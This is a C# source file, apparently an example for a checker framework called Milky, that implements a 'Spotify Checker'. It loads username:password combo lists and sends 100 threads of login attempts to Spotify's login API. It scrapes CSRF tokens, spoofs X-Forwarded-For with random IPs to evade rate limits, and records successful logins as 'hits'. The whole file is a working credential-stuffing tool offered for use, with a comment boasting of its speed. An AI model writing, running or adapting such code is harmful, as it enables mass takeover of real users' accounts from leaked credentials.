using Milky.Enums;
using Milky.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Milky.Examples
{
    class Spotify_Checker
    {
        static async Task Main()
        {
            var combos = new List<Combo>();

            foreach (string combo in File.ReadAllLines("combos.txt"))
            {
                string[] comboParts = combo.Split(':');

                if (!(comboParts.Length < 2))
                {
                    combos.Add(new Combo
                    {
                        Username = comboParts[0],
                        Password = comboParts[1]
                    });
                }
            }

            var check = new MilkyCheck()
                .WithCombos(combos)
                .WithArgs(new object[]
                {
                    new HttpClient(),
                    new Random(),
                    new object()
                })
                .WithSettings(new CheckSettings
                {
                    Threads = 100,
                    OutputInvalids = false
                })
                .WithCheckingProcess(async (combo, proxy, args) =>
                {
                    var httpClient = (HttpClient)args[0];
                    var random = (Random)args[1];
                    var locker = args[2];

                    var result = CheckResult.Unknown;
                    Dictionary<string, string> captures = null;

                    string randomIp;

                    while (result == CheckResult.Unknown)
                    {
                        lock (locker)
                        {
                            randomIp = string.Join(".", random.Next(1, 256), random.Next(0, 256), random.Next(0, 256), random.Next(0, 256));
                        }

                        try
                        {
                            var requestMessage1 = new HttpRequestMessage(HttpMethod.Get, "https://accounts.spotify.com/en/login");
                            requestMessage1.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);

                            var responseMessage1 = await httpClient.SendAsync(requestMessage1);

                            result = CheckResult.Invalid;

                            string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value;
                            if (string.IsNullOrEmpty(csrfToken)) continue; // Sadly, this checker triggers Spotify Rate limit. Ignoring rate limit, it is able to reach a solid 400K CPM!

                            using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                            {
                                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                                {
                                    { "username", combo.Username },
                                    { "password", combo.Password },
                                    { "csrf_token", csrfToken }
                                })
                            };

                            requestMessage2.Headers.TryAddWithoutValidation("Cookie", string.Join(";", $"csrf_token={csrfToken}", "__bon=MHwwfDB8MHwxfDF8MXwx"));
                            requestMessage2.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
                            requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");

                            var responseMessage2 = await httpClient.SendAsync(requestMessage2);

                            var content2 = await responseMessage2.Content.ReadAsStringAsync();

                            if (content2.Contains("errorInvalidCredentials"))
                                result = CheckResult.Invalid;
                            else if (content2.Contains("displayName"))
                                result = CheckResult.Hit;

                            // Missing capture, I'm too lazy to add it. So, if anyone wanna do so, feel free to submit a pull request!
                        }
                        catch { }
                    }

                    return (result, captures);
                });

            var console = new MilkyConsole()
                .WithCheck(check)
                .WithMeta(new Meta
                {
                    Name = "Spotify Checker",
                    Version = "1.0.0",
                    Author = "Laiteux"
                })
                .WithSettings(new ConsoleSettings
                {
                    ShowFree = false,
                    ShowPercentages = true
                })
                .WithRefreshDelay(TimeSpan.FromMilliseconds(100));

            console.Start();
            await check.StartAsync();

            await Task.Delay(-1);
        }
    }
}
